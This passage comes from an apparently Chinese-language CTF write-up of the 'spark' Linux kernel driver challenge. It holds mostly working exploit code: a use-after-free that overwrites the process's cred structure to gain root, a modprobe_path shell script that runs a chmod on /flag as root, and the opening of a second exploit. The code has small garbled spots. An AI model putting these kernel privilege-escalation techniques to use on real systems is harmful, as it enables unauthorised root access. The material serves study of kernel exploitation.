<span class="hljs-keyword">int</span> *scratch_fds, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_dist_addr,</span></span><br><span class="hljs-params"><span class="hljs-function">                   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_node_addr)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Finding victim node\n&quot;</span>);<br>    <span class="hljs-comment">//*.......nb</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> victim_addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">6000</span>; i &lt; <span class="hljs-number">10000</span>; i++)<br>    &#123;<br>        <span class="hljs-comment">//*why the node is sizeof(node_t) aligned???</span><br>        <span class="hljs-comment">//*is there something strange in kernel slab memory manager?</span><br>        <span class="hljs-comment">//*7000~7800</span><br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr = s1_node_addr + i * <span class="hljs-number">0x80</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> value = stage3_read(ctx, fd, addr + <span class="hljs-number">0x58</span>);<br>        <span class="hljs-keyword">if</span> (value == STAGE3_READ_NUM_CHILDREN)<br>        &#123;<br>            victim_addr = addr;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    assert(victim_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Victim @ 0x%lx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Findings creds\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> current = stage3_read(ctx, fd, victim_addr + <span class="hljs-number">0x10</span>); <span class="hljs-comment">// state_lock.owner</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] current = 0x%lx\n&quot;</span>, current);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cred_addr = stage3_read(ctx, fd, current + <span class="hljs-number">0xa90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] cred @ 0x%lx\n&quot;</span>, cred_addr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Crafting linkable node\n&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x0</span>) = <span class="hljs-number">100000</span>;              <span class="hljs-comment">// id</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;                    <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = <span class="hljs-number">0</span>;                   <span class="hljs-comment">// is_finalized</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x60</span>) = victim_addr + <span class="hljs-number">0x60</span>; <span class="hljs-comment">// edges.next (empty list)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x68</span>) = victim_addr + <span class="hljs-number">0x68</span>; <span class="hljs-comment">// edges.prev (empty list)</span><br>    reclaim_free(ctx);<br>    reclaim_alloc_raw(ctx, buf);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Building graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> graph_fds[S1_DIST_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; S1_DIST_NUM_NODES - <span class="hljs-number">1</span>; i++)<br>        graph_fds[i] = scratch_fds[i]; <span class="hljs-comment">// avoid allocations, they mess stuff up</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; S1_DIST_NUM_NODES - <span class="hljs-number">1</span>; i++)<br>        llink(graph_fds[<span class="hljs-number">0</span>], graph_fds[i], <span class="hljs-number">0</span>);<br>    llink(graph_fds[<span class="hljs-number">0</span>], fd, <span class="hljs-number">0</span>); <span class="hljs-comment">// weight = write primitive value (zero for root creds)</span><br>    finalize(graph_fds[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Freeing stage1 dist array\n&quot;</span>);<br>    <span class="hljs-comment">//*due to stage 1 child process crashed, we have no choice but this method.</span><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;                     <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = <span class="hljs-number">1</span>;                    <span class="hljs-comment">// is_finalized</span><br>                                                          <span class="hljs-comment">// fake node_array overlaps unused nb_lock</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x38</span> + <span class="hljs-number">0x0</span>) = <span class="hljs-number">0</span>;             <span class="hljs-comment">// fake node_array.size</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x38</span> + <span class="hljs-number">0x10</span>) = s1_dist_addr; <span class="hljs-comment">// fake node_array.nodes (will be freed)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x60</span>) = victim_addr + <span class="hljs-number">0x60</span>;  <span class="hljs-comment">// edges.next (empty list)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x78</span>) = victim_addr + <span class="hljs-number">0x38</span>;  <span class="hljs-comment">// traversal = fake node_array</span><br>    reclaim_free(ctx);<br>    reclaim_alloc_raw(ctx, buf);<br>    release(fd);   <span class="hljs-comment">// free s1_dist_addr</span><br>    fd = create(); <span class="hljs-comment">// immediately reclaim victim node to restore stable state</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Overwriting cred\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> write_addr = cred_addr + <span class="hljs-number">8</span> * <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> idx = (write_addr - s1_dist_addr) / <span class="hljs-number">8</span>;<br>    reclaim_free(ctx);<br>    reclaim_alloc(ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, idx, <span class="hljs-number">0</span>);<br>    query(graph_fds[<span class="hljs-number">0</span>], graph_fds[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//kmalloc the orignal s1_dist_addr</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print_flag</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDONLY);<br>    assert(fd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    assert(read(fd, buf, <span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>) != <span class="hljs-number">-1</span>);<br>    close(fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;!!! FLAG: %s\n&quot;</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//*what are these?</span><br>    <span class="hljs-keyword">int</span> scratch_fds[<span class="hljs-number">12</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++)<br>        scratch_fds[i] = create();<br><br>    <span class="hljs-comment">// Leak a distance array (still malloc&#x27;ed) and the address of a live node</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_dist_addr, s1_node_addr;<br>    <span class="hljs-keyword">int</span> s1_node_fd;<br>    stage1(&amp;s1_dist_addr, &amp;s1_nod e_addr, &amp;s1_node_fd);<br><br>    <span class="hljs-comment">// Get a fd that can be freed and reclaimed repeatedly</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span> <span class="hljs-title">victim_ctx</span>;</span><br>    <span class="hljs-keyword">int</span> victim_fd;<br>    stage2(&amp;victim_ctx, &amp;victim_fd);<br><br>    <span class="hljs-comment">// Get somewhat rootish privileges</span><br>    stage3(&amp;victim_ctx, victim_fd, scratch_fds, s1_dist_addr, s1_node_addr);<br><span class="hljs-function">F4</span><br><span class="hljs-function">    <span class="hljs-title">print_flag</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="来自perfectblue的exp"><a href="#来自perfectblue的exp" class="headerlink" title="来自perfectblue的exp:"></a>来自perfectblue的exp:</h3><p>mutex的结构: </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> &#123;</span><br>  <span class="hljs-keyword">uint64_t</span> owner;<br>  <span class="hljs-keyword">uint64_t</span> wait_lock;<br>  <span class="hljs-keyword">void</span>* prev;<br>  <span class="hljs-keyword">void</span>* next;<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>改进细节:</p>
<ul>
<li>第一次crash可以使用<code>refcount_warn_saturate</code>. 这样只要令refcount等于0, 就会触发finalize中的警告, 从而导致crash的产生, 不过exp中简单的使用了sleep等待线程, 以及手动输入dmesg信息. 上面一个战队的exp中解析内核日志的代码可以拿来重复利用, 免得在调试的时候浪费时间.<br>好吧这很有问题, 进入了这个函数之后寄存器值都变了. 不好评价. </li>
<li>好了, 看不懂那个leak出来的是个啥, 什么是kmalloc_32/128???也没个wp解释一下. </li>
</ul>
<h4 id="exp-略"><a href="#exp-略" class="headerlink" title="exp: 略"></a>exp: 略</h4><h3 id="来自balsn战队"><a href="#来自balsn战队" class="headerlink" title="来自balsn战队:"></a>来自balsn战队:</h3><p>仅仅两百多行, 这么简洁. </p>
<ul>
<li>crash用到了<code>refcount_warn_saturate</code>. 原因是finalize之前release会使refcount变0. </li>
<li>用到了msgsnd, 也就是kmalloc有最大和最小长度限制, 而且有一个0x30(48)字节的头部. </li>
<li>msgsnd只能控制后0x50的区域. 也就是<strong>最后四行</strong> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node_t</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">uint64_t</span> id;<br>  <span class="hljs-keyword">uint64_t</span> refcount;<br>  <span class="hljs-keyword">char</span> state_lock[<span class="hljs-number">32</span>];<br>  <span class="hljs-keyword">uint64_t</span> is_finalized;<br>  <span class="hljs-keyword">char</span> nb_lock[<span class="hljs-number">32</span>];<br>  <span class="hljs-comment">//following is under control</span><br>  <span class="hljs-keyword">uint64_t</span> num_children;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head_t</span> <span class="hljs-title">edges</span>;</span><br>  <span class="hljs-keyword">uint64_t</span> traversal_idx;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node_list_t</span> *<span class="hljs-title">traversal</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>不知道怎么得出的rbx中存储kernel_heap, 不过可能是从崩溃信息中对比和真实heap最接近的一个寄存器地址. </li>
<li>用了一个很巧妙的方法来获取dis_arr的地址, 在用户区建立一个很大的缓冲区, 猜测在已有的heap地址附近, 让idx偏移越界溢出从内核地址绕回到缓冲区中, 检查哪个地址上的数据被修改就可推算真实的dis_arr. 再根据dis_arr来算出和modprobe的地址. 进而修改到shellcode函数中.<br>可行的原因为未开smep+smap. </li>
</ul>
<p>遇到的问题:</p>
<ul>
<li>读取内核错误信息莫名出错, 换成了<code>klogctl</code>才成功. 修改用参数来crash的神奇操作. 修改kernel_ret为query的返回地址在栈上的存储位置. </li>
</ul>
<p>modprobe:</p>
<p>重点在于造一个头部未知的程序. 执行后内核自会使用<code>/tmp/y</code>处理, 然而它只修改了<code>/flag</code>的权限就退出了. 正好也是我们的目的. </p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span>                                           <br>echo -ne &#x27;\xffyyy&#x27; &gt; fake<br>echo -ne &#x27;#!/bin/sh\n/bin/chmod 777 /flag&#x27; &gt; /tmp/y<br>chmod +x fake<br>chmod +x /tmp/y<br>/balsn<br>/balsn<br>/balsn<br>cat /flag<br></code></pre></div></td></tr></table></figure>

<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// musl-gcc exp.c -o exp -static -masm=intel</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_LINK 0x4008D900</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_GET_INFO 0x8018D901</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_FINALIZE 0xD902</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_QUERY 0xC010D903</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAUSE scanf(<span class="hljs-meta-string">&quot;%*c&quot;</span>);</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> fd1;<br>    <span class="hljs-keyword">int</span> fd2;<br>    <span class="hljs-keyword">size_t</span> distance;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> *<span class="hljs-title">fd</span>, *<span class="hljs-title">bk</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> id;<br>    <span class="hljs-keyword">size_t</span> refcount;<br>    <span class="hljs-keyword">size_t</span> state_lock[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">size_t</span> finalized;<br>    <span class="hljs-keyword">size_t</span> nb_lock[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">size_t</span> num_edges;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> <span class="hljs-title">link_header</span>;</span><br>    <span class="hljs-keyword">size_t</span> index;<br>    <span class="hljs-keyword">size_t</span> tra;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Edge</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> <span class="hljs-title">link_header</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">dst_node</span>;</span><br>    <span class="hljs-keyword">size_t</span> weight;<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> fd[<span class="hljs-number">100</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">link</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> weight)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// printf(&quot;Creating link between &#x27;%d&#x27; and &#x27;%d&#x27; with weight %u\n&quot;, a, b, weight);</span><br>    assert(ioctl(fd[a], SPARK_LINK, fd[b] | ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)weight &lt;&lt; <span class="hljs-number">32</span>)) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span> <span class="hljs-title">qry</span> =</span> &#123;<br>        .fd1 = fd[a],<br>        .fd2 = fd[b],<br>    &#125;;<br>    <span class="hljs-keyword">int</span> ret = ioctl(fd[i], SPARK_QUERY, &amp;qry);<br>    <span class="hljs-comment">// printf( &quot;[query] ret = %d\n&quot; , ret );</span><br>    <span class="hljs-comment">// printf(&quot;The length of shortest path between &#x27;%d&#x27; and &#x27;%d&#x27; is %lld\n&quot;, a, b, qry.distance);</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_info</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span> buf[<span class="hljs-number">3</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0xcc</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    assert(ioctl(fd[a], SPARK_GET_INFO, buf) == <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[get info %d] &quot;</span>, a);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p &quot;</span>, buf[i]);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_open</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    fd[i] = open(<span class="hljs-string">&quot;/dev/node&quot;</span>, O_RDWR);<br>    assert(fd[i] &gt;= <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    close(fd[i]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_finalize</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd[i], SPARK_FINALIZE);<br>&#125;<br><br><span class="hljs-comment">// for kmalloc</span><br><span 